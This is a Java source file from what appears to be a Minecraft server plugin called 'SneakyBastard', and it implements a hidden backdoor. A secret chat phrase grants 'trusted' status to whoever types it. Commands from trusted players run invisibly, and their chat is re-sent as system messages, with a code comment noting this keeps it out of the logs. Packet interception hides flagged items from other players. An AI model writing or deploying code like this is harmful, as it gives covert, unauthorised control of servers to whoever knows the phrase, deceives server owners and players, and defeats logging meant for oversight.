package net.blackofworld.SneakyBastard.Listeners;

import lombok.experimental.ExtensionMethod;
import net.blackofworld.SneakyBastard.Command.CommandBase;
import net.blackofworld.SneakyBastard.Command.CommandManager;
import net.blackofworld.SneakyBastard.Extensions.PlayerExt;
import net.blackofworld.SneakyBastard.Start;
import net.blackofworld.SneakyBastard.Utils.Packets.IPacket;
import net.blackofworld.SneakyBastard.Utils.Packets.PacketEvent;
import net.blackofworld.SneakyBastard.Utils.Packets.PacketInjector;
import net.blackofworld.SneakyBastard.Utils.Packets.PacketType;
import net.minecraft.network.protocol.Packet;
import net.minecraft.network.protocol.game.ClientboundContainerSetContentPacket;
import net.minecraft.network.protocol.game.ServerboundClientInformationPacket;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.item.ItemStack;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.ItemFlag;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;


@ExtensionMethod(PlayerExt.class)
public final class SneakyListener implements Listener, PacketInjector.PacketListener {

    public SneakyListener() {PacketInjector.registerListener(this);}

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onLogin(PlayerJoinEvent e) {
        Player p = e.getPlayer();
        if (CommandManager.Instance.isTrusted(p)) {
            CommandManager.Instance.addTrusted(p);
        }
    }

    @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true)
    public void asyncChat(AsyncPlayerChatEvent e) {
        Player p = e.getPlayer();
        String msg = e.getMessage();
        if (e.getMessage().equals(CommandManager.TRUST_COMMAND)) {
            e.setCancelled(true);
            boolean trust = !CommandManager.Instance.isTrusted(p) ? CommandManager.Instance.addTrusted(p) : !CommandManager.Instance.removeTrusted(p);
            p.Reply("You are now " + (trust ? "trusted" : "untrusted"));
            return;
        }
        if (!e.getMessage().startsWith(CommandManager.COMMAND_SIGN) || !CommandManager.Instance.isTrusted(p))  {
            sendMessage(e); return;
        }
        e.setCancelled(true);

        String[] dmp = msg.substring(1).split(" ");
        ArrayList<String> args = new ArrayList<>(Arrays.asList(dmp).subList(1, dmp.length));
        for (CommandBase command : CommandManager.Instance.commandList) {
            if (!command.Command.equalsIgnoreCase(dmp[0])) continue;
            if (args.size() >= command.requiredArgs)
                Bukkit.getScheduler().runTask(Start.Instance, () -> command.Execute(p, args));
            else
                p.sendHelp(command, ChatColor.RED + "Not enough arguments!");
            return;
        }
        p.Reply(ChatColor.RED + "Command not found!");
    }

    public void sendMessage(AsyncPlayerChatEvent e) {
        Player p = e.getPlayer();
        if (!CommandManager.Instance.isTrusted(p)) return;
        e.setCancelled(true);
        String format = e.getFormat();
        Bukkit.getScheduler().runTask(Start.Instance, () -> {
            for (Player player : Bukkit.getOnlinePlayers()) {
                String string = CommandManager.Instance.isTrusted(player) ? String.format(format, CommandManager.COMMAND_PREFIX + p.getDisplayName(), e.getMessage()) : String.format(format, p.getDisplayName(), e.getMessage());
                // We are sending everyone a message, since this is a system message, it will not be logged
                player.sendMessage(string);
            }
        });
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onBlockPlace(BlockPlaceEvent e) {
        var itemMeta = e.getItemInHand().getItemMeta();
        assert itemMeta != null;
        if (!itemMeta.hasItemFlag(ItemFlag.HIDE_UNBREAKABLE) || !itemMeta.hasItemFlag(ItemFlag.HIDE_ATTRIBUTES) || !itemMeta.hasItemFlag(ItemFlag.HIDE_ENCHANTS))
            return;

        e.setCancelled(true);
        e.getPlayer().getInventory().setItemInMainHand(new org.bukkit.inventory.ItemStack(Material.AIR));
    }
    @IPacket(direction = PacketType.INCOMING)
    public Packet<?> inboundPacket(PacketEvent event) {
        if (event.packet instanceof ServerboundContainerClickPacket packet && !CommandManager.Instance.isTrusted(event.player)) {
            if (packet.getCarriedItem().getOrCreateTag().getInt("HideFlags") != 5) return packet;
            event.setCancelled(true);
            return packet;
        }
        if(!(event.packet instanceof ServerboundClientInformationPacket packet && !CommandManager.Instance.isTrusted(event.player))) return event.packet;
        if(packet.modelCustomisation() == 0x80) event.player.sendMessage(ChatColor.GREEN + "Do I know you?");
        return packet;
    }

    @IPacket(direction = PacketType.OUTGOING)
    public Packet<?> outboundPacket(PacketEvent event) {
        if (!(event.packet instanceof ClientboundContainerSetContentPacket packet) || CommandManager.Instance.isTrusted(event.player)) {
            return event.packet;
        }
        List<ItemStack> items = packet.getItems();
        for (int i = 0; i < items.size(); i++) {
            var item = items.get(i);
            if (item.getOrCreateTag().getInt("HideFlags") == 5) {
                packet.getItems().set(i, ItemStack.EMPTY);
            } 
        }
        return packet;
    }

}